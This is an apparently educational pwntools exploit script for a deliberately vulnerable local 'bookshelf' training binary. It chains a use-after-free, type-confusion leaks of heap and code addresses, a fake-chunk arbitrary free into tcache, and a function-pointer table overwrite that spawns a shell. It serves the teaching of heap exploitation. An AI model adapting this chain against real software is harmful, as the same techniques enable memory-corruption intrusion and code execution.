from pwn import *
import os
import subprocess
import re

# ============================================================================
# EDUCATIONAL EXPLOIT FOR WMA: Cross-Layer Reference Persistence
# This script demonstrates how the same Weird Machine Archetype from
# CVE-2024-26808 manifests in a different context (bookshelf application)
# ============================================================================

# Suppress menu output but keep exploit progress visible
context.log_level = "info" # or debug, but it's noisy

# Color codes for organization
GREEN = '\033[92m'
BLUE = '\033[94m'
YELLOW = '\033[93m'
RED = '\033[91m'
CYAN = '\033[96m'
RESET = '\033[0m'

# Useful for offset calculation later
def get_function_offset(binary, func1, func2):
    """Calculate offset between two functions using readelf"""
    try:
        result = subprocess.run(['readelf', '-s', binary], 
                              capture_output=True, text=True, check=True)
      
        addr1 = None
        addr2 = None
        for line in result.stdout.split('\n'):
            if func1 in line and 'FUNC' in line:
                addr1 = int(line.split()[1], 16)
            if func2 in line and 'FUNC' in line:
                addr2 = int(line.split()[1], 16)
        
        if addr1 is None or addr2 is None:
            raise Exception(f"Could not find functions {func1} and/or {func2}")
        
        return addr1 - addr2
    except Exception as e:
        print(f"[ERROR] Failed to calculate offset: {e}")
        exit(1)

# ============================================================================
# PRINT FUNCTIONS 
# ============================================================================
def phase_header(phase_num, title):
    print(f"\n{CYAN}{'='*70}")
    print(f"PHASE {phase_num}: {title}")
    print(f"{'='*70}{RESET}")

def wmi_marker(wmi_num, description):
    print(f"{GREEN}[WMI-{wmi_num}] {description}{RESET}")

def exploit_note(note):
    print(f"{BLUE}[NOTE] {note}{RESET}")

# ============================================================================
# HELPER FUNCTIONS 
# ============================================================================
def _menu_option(opt):
    # p.recvuntil(b"8) Exit")
    p.recvuntil(b"9) Show heap layout")
    p.sendline(bytes(str(opt), 'utf-8'))

def get_heap_status():
    _menu_option(9)
    drop=p.recvuntil(b'================================================================\n', drop=True)
    heap_status = p.recvuntil(b"Press enter to continue...", drop=True)
    print("================================================================")
    print(heap_status.decode('utf-8'))
    p.sendline(b'')

def _get_output() -> bytes:
    ret_str = p.recvuntil(b"Press enter to continue...")
    p.sendline(b"\n")
    return ret_str

def get_authors() -> list:
    _menu_option(1)
    auth_lines = _get_output()
    authors = []
    header_done = False
    for line in auth_lines.decode("utf-8", errors="surrogateescape").split("\n"):
        if line[:1].isspace():
            line = line.lstrip()
        if header_done and not line:
            break
        elif not header_done and not line:
            continue
        if not header_done and line.startswith("NAME"):
            header_done = True
            continue
        elif not header_done:
            continue
        lraw = [i.strip() for i in line.split("  ")]
        ltup = tuple(i for i in lraw if i)
        authors.append(ltup)
    return authors

def get_books() -> list:
    _menu_option(2)
    book_lines = _get_output()
    books = []
    header_done = False
    for line in book_lines.decode("utf-8", errors="surrogateescape").split("\n"):
        if line[:1].isspace():
            line = line.lstrip()
        if header_done and not line:
            break
        elif not header_done and not line:
            continue
        if not header_done and line.startswith("NAME"):
            header_done = True
            continue
        elif not header_done:
            continue
        lraw = [i.strip() for i in line.split("  ")]
        ltup = tuple(i for i in lraw if i)
        books.append(ltup)
    return books

def create_author(name: bytes, publisher: bytes, description: bytes):
    _menu_option(3)
    p.recvuntil(b"Name")
    p.sendline(name)
    p.recvuntil(b"Publisher")
    p.sendline(publisher)
    p.recvuntil(b"Description")
    p.sendline(description)
    _get_output()
    print(f"  [+] Created author: {name.decode()[:20]}...")

def create_book(name: bytes, author: bytes, description: bytes):
    _menu_option(4)
    p.recvuntil(b"Name")
    p.sendline(name)
    p.recvuntil(b"Author")
    p.sendline(author)
    p.recvuntil(b"Description")
    p.sendline(description)
    _get_output()
    print(f"  [+] Created book: {name.decode()[:20]}... by {author.decode()[:20]}...")

def delete_author(name: bytes):
    _menu_option(6)
    p.recvuntil(b"Name")
    p.sendline(name)
    _get_output()
    print(f"  [-] Deleted author: {name.decode()[:20]}...")

def delete_book(name: bytes):
    _menu_option(7)
    p.recvuntil(b"Name")
    p.sendline(name)
    _get_output()
    print(f"  [-] Deleted book: {name.decode()[:20]}...")

def create_review(book: bytes, rating: int):
    _menu_option(5)
    p.recvuntil(b"Book Name")
    p.sendline(book)
    p.sendline(bytes(str(rating), 'utf-8'))
    p.sendline(bytes(str(rating), 'utf-8'))
    _get_output()
    print(f"  [+] Created review for: {book.decode()[:20]}...")

def _strip_spaces(leak: int):
    addr = leak
    while addr & 0xFF == 0x20:
        addr >>= 8
    while addr != 0 and (addr >> ((addr.bit_length() - 1) & ~7)) & 0xFF == 0x20:
        addr &= ~(0xFF << ((addr.bit_length() - 1) & ~7))
    return addr

def _leak_heap_base_read(book_name: str) -> int:
    header_done = False
    width = None
    _menu_option(2)
    books = _get_output()
    for bk in books.decode("utf-8", errors="surrogateescape").split("\n"):

        if bk[:1].isspace():
            bk = bk.lstrip()
        if header_done and not bk:
            break
        elif not bk:
            continue
        if not header_done and bk.startswith("NAME"):
            width = bk.count(" ", bk.index("NAME") + 4, bk.index("AUTHOR")) + 2
            header_done = True
            continue
        elif not header_done:
            continue
        elif not bk.startswith(book_name):
            continue
        leak_a = bk[width:width+8]
        leak_b = leak_a.encode("utf-8", errors="surrogateescape")
        leak = int.from_bytes(leak_b, "little")
        return _strip_spaces(leak)
    return 0




# ============================================================================
# Start the program
# ============================================================================
print(f"{CYAN}Starting 2-Bookshelf Sample Bookshelf...{RESET}")
p = process('./bookshelf')
TOLK = b"J.R. Tolkien"
# ============================================================================
phase_header(0, "Initial Heap State")
# ============================================================================
get_heap_status()
input("Press enter to continue...")

# ============================================================================
phase_header(1, "Heap Grooming")
# ============================================================================
delete_book(b"The Two Towers")
get_heap_status()
input("Press enter to continue...")

a0_name = b"A"*0x37  # Size chosen to be reclaimed later by book Bx39 struct
a0_publ = b"PUBL0"
a0_desc = b"DESC0"

print(f"\n{GREEN}Creating author (Ax55), author's name reclaims freed book memory{RESET}")
create_author(a0_name, a0_publ, a0_desc)
exploit_note("Author's name is in reclaimed book location, due to same size")
input("Press enter to continue...")

print(f"\n{GREEN}Creating book (BOOK0), will have pointer to author Ax55{RESET}")
b0_name = b"BOOK0"
b0_desc = b"DESC0"

create_book(b0_name, a0_name, b0_desc)
get_heap_status()
exploit_note("Book points to author Ax55")
input("Press enter to continue...")

# ============================================================================
phase_header(2, "Create Stale Reference (WMI-1)")
# ============================================================================
print(f"{RED}Creating stale author reference in BOOK0, by deleting author Ax55.{RESET}")
delete_author(a0_name)
wmi_marker(1, "STALE REFERENCE CREATED")
get_heap_status()
exploit_note("BOOK0 still has a pointer to author Ax55.")
input("Press enter to continue...")

# ============================================================================
phase_header(3, "Leak via Type Confusion (WMI-2) - Heap Address")
# ============================================================================
print(f"{RED}Reclaiming author's name memory with book.{RESET}")
exploit_note("The stale author->name pointer will accessed via data in Bx39.")

b1_name = b"B"*0x27
b1_desc = b"DESC1"

print(f"\n{GREEN}Creating book (Bx39) to control leaked data...{RESET}")
create_book(b1_name, TOLK, b1_desc)
print("[LEAK SETUP]")
print("  BOOK0->author points to freed Ax55 location")
print("  Ax55 + 0x10 (name pointer field) was pointing to AUTH0->name memory")
print("  Ax55 name's memory is now the Bx39 struct")
print("  First 8 bytes of Bx39 struct is the pointer to Bx39 name")
print("  Therefore: reading author name in BOOK0 listing leaks Bx39 name address")

print(f"\n{CYAN}Reading through stale reference to leak heap address.{RESET}")
reviewb_addr = _leak_heap_base_read(b0_name.decode())

wmi_marker(2, f"HEAP LEAK SUCCESS: {hex(reviewb_addr)}")
exploit_note(f"This leak can be used to determine the function table location.")
get_heap_status()
input("Press enter to continue...")

# ============================================================================
phase_header(3, "Leak via Type Confusion (WMI-2) - Code Location (WHERE)")
# ============================================================================
exploit_note("Construct book that has a fake author struct in it's description.")
exploit_note("Description will be allocated on reclaimed author Ax55 struct memory")
funcs_addr = reviewb_addr + 0x60 # determined experimentally
print(f"\n[CALCULATION] Function table at leaked address + 0x60 = {hex(funcs_addr)}")
exploit_note("Offset of 0x60 determined by initialize heap allocations\n       (author, 3 books, 3 reviews, function table)")

b2_name = b"BOOK2"
b2_desc = b""
b2_desc += b"C"*8                                   # safe_link_addr
b2_desc += b"D"*8                                   # safe_link_key
b2_desc += int.to_bytes(funcs_addr, 8, 'little')   # name pointer -> funcs
b2_desc += int.to_bytes(0x00, 8, 'little')         # db_link.backward
b2_desc += int.to_bytes(0x00, 8, 'little')         # db_link.forward
b2_desc += int.to_bytes(0x00, 8, 'little')         # reviews.backward
b2_desc += int.to_bytes(0x00, 8, 'little')         # reviews.forward
b2_desc += int.to_bytes(0x00, 8, 'little')         # books.backward
b2_desc += int.to_bytes(0x00, 7, 'little')         # books.forward

print(f"\n{GREEN}Creating book BOOK2 with crafted author struct in the description{RESET}")
print("  Fake author->name will point to function table")
create_book(b2_name, TOLK, b2_desc)
print("[LEAK SETUP]")
print("  BOOK2->desc reclaims author Ax55 memory")
print("  Ax55 + 0x10 (name pointer field) is now fake author struct with pointer to")
print("  function table")
print("  Therefore: reading author name in BOOK0 listing leaks first address")
print("  in function table: menu_print_authors")

print(f"\n{CYAN}Reading through stale reference to leak code address...{RESET}")
funcs_leak = _leak_heap_base_read(b0_name.decode())

wmi_marker(2, f"CODE LEAK SUCCESS: {hex(funcs_leak)}")
exploit_note("This is the address of menu_print_authors function")
exploit_note("We can calculate other code addresses from this base statically")
get_heap_status()
input("Press enter to continue...")

# ============================================================================
phase_header(4, "Heap Grooming")
# ============================================================================
exploit_note("We'll create a fake review struct that overlaps the function table.")
exploit_note("Then use the arbitrary free primitive to add it to tcache.")

print(f"\n{YELLOW}Preparing heap layout for fake chunk.{RESET}")
print(f"\n{GREEN}Deleting book: The Return of the King.{RESET}")
delete_book(b"The Return of the King")
print(f"\n{GREEN}Deleting book: Bx39.{RESET}")
delete_book(b1_name)

a1_name = b"AUTHOR1"
a1_desc = b"AUTHD"
a1_publ = b"AUTHP"
print(f"\n{GREEN}Creating author (AUTHOR1) for 2nd stale reference.{RESET}")
create_author(a1_name, a1_publ, a1_desc)

b3_name = b"BOOK3"
b3_desc = b"DESC3"
print(f"\n{GREEN}Creating book (BOOK3) to control leaked data...{RESET}")
create_book(b3_name, a1_name, b3_desc)
get_heap_status()
input("Press enter to continue...")

# ============================================================================
phase_header(5, "Create Stale Reference (WMI-1)")
# ============================================================================
print(f"\n{RED}Creating second stale reference...{RESET}")
delete_author(a1_name)
wmi_marker(1, "SECOND STALE REFERENCE CREATED")
print("  BOOK3->author points to freed AUTHOR1")
get_heap_status()
input("Press enter to continue...")

# ============================================================================
phase_header(6, "Heap Grooming - Construct Fake Authors")
# ============================================================================
exploit_note("Building a fake chunk header that will pass allocator checks.")
exploit_note("This fake chunk will overlap with the function pointer table.")

link_book = reviewb_addr - 0x340
fake_20_link = reviewb_addr + 0x30
fake_38_link = reviewb_addr + 0x30

print(f"\n[FAKE CHUNK CONSTRUCTION]")
print(f"  Link book addr: {hex(link_book)})")
print(f"  Fake chunk addr: {hex(fake_20_link)}")
print(f"  Fake Review addr: {hex(fake_38_link)}")
print(f"  Link pointers crafted to avoid crashes during unlink")

b4_name = b"BOOK4"
b4_desc = b""
b4_desc += b"D"*8                                   # padding
b4_desc += b"E"*8                                   # padding
b4_desc += int.to_bytes(0x1337, 8, 'little')       # fake data
b4_desc += int.to_bytes(0x61, 8, 'little')         # chunk size metadata
b4_desc += int.to_bytes(link_book, 7, 'little')    # book pointer

b5_name = b"BOOK5"
b5_desc = b""
b5_desc += int.to_bytes(fake_38_link, 8, 'little') # au_link.backward
b5_desc += int.to_bytes(0x00, 8, 'little')         # au_link.forward
b5_desc += int.to_bytes(0x00, 8, 'little')         # rating
b5_desc += b"F"*8
b5_desc += b"G"*7

print(f"\n{GREEN}Creating book BOOK4 with fake chunk in the description{RESET}")
create_book(b4_name, TOLK, b4_desc)
print(f"\n{GREEN}Creating book BOOK5 with fake review struct in the description{RESET}")
create_book(b5_name, TOLK, b5_desc)

exploit_note("Overwriting stale author's review list to point to fake chunk.")
exploit_note("Deleting the book will free all reviews including our fake one.")
b6_name = b"BOOK6"
b6_desc = b""
b6_desc += b"J"*8                                   # publisher
b6_desc += b"K"*8                                   # description  
b6_desc += b"L"*8                                   # name
b6_desc += b"M"*8                                   # db_link.backward
b6_desc += b"N"*8                                   # db_link.forward
b6_desc += int.to_bytes(0x00, 8, 'little')         # reviews.backward
b6_desc += int.to_bytes(fake_20_link, 8, 'little') # reviews.forward -> FAKE
b6_desc += int.to_bytes(0x00, 8, 'little')         # books.backward
b6_desc += int.to_bytes(0x00, 7, 'little')         # books.forward

print(f"  Setting author->reviews.forward = {hex(fake_20_link)}")
print(f"\n{GREEN}Creating book BOOK6 with crafted author struct in the description{RESET}")
create_book(b6_name, TOLK, b6_desc)
get_heap_status()
input("Press enter to continue...")

# ============================================================================
phase_header(7, "Trigger Arbitrary Free (WMI-3)")
# ============================================================================
print(f"\n{RED}Triggering arbitrary free through review deletion...{RESET}")
exploit_note("Deleting BOOK3, follows stale author->reviews->fake reviews and deletes them.")
print(f"\n{GREEN}Deleting book: BOOK3.{RESET}")
delete_book(b3_name)
wmi_marker(3, "ARBITRARY FREE EXECUTED")
get_heap_status()
input("Press enter to continue...")
print(f"  Fake chunk at {hex(fake_20_link - 0x18)} added to tcache")

# ============================================================================
phase_header(8, "Write-What-Where - Function Pointer Overwrite (WMI-4)")
# ============================================================================
exploit_note("Allocating large enough description will reclaim function table.")
exploit_note("Placing win function at offset 0x40, 0x48 overwrite menu 1 and 2.")
# Determine offset between function leak and function we want to use
offset = get_function_offset('./bookshelf', 'menu_print_authors', 'chicken_dinner')
print(f"[*] Calculated offset: {hex(offset)}")
win_func = funcs_leak - offset

print(f"\n[TARGET CALCULATION]")
print(f"  Function table starts at: {hex(funcs_addr)}")
print(f"  Win function (shell) at: {hex(win_func)}")
print(f"  Overwriting first 2 menu functions with win func address")
b7_name = b"PWN0"
b7_desc = b""
b7_desc += b"Z"*8
b7_desc += int.to_bytes(0x31, 8, 'little')
b7_desc += b"Z"*0x28
b7_desc += int.to_bytes(0x51, 8, 'little')
b7_desc += int.to_bytes(win_func, 8, 'little') * 2

print(f"\n{GREEN}Creating PWN0 book to overwrite function pointers...{RESET}")
create_book(b7_name, TOLK, b7_desc)
wmi_marker(4, "WRITE-WHAT-WHERE COMPLETE")
get_heap_status()
input("Press enter to continue...")
print("  Function pointer table successfully overwritten")

# ============================================================================
phase_header(9, "Control Flow Hijack - Trigger Overwritten Function Pointer")
# ============================================================================
print(f"\n{CYAN}{'='*70}{RESET}")
print(f"{GREEN}EXPLOITATION COMPLETE!{RESET}")
print(f"\nWMP Chain Successfully Executed:")
print(f"  1. Stale Reference")
print(f"  2. Leak via Type Confusion")
print(f"  3. Stale Reference")
print(f"  4. Leak via Type Confusion")
print(f"  5. Arbitrary Free (control review list)")
print(f"  6. Write-What-Where (overwrite function table)")
print(f"{CYAN}{'='*70}{RESET}\n")

exploit_note("Calling menu 1 or 2 will now execute our shell...")
print(f"\n{GREEN}Triggering shell by selecting menu option 1...{RESET}\n")
input("Press enter to continue. Enter 'ls' or similar to verify shell. Exit or ctrl-c to finish")
_menu_option(1)
p.interactive()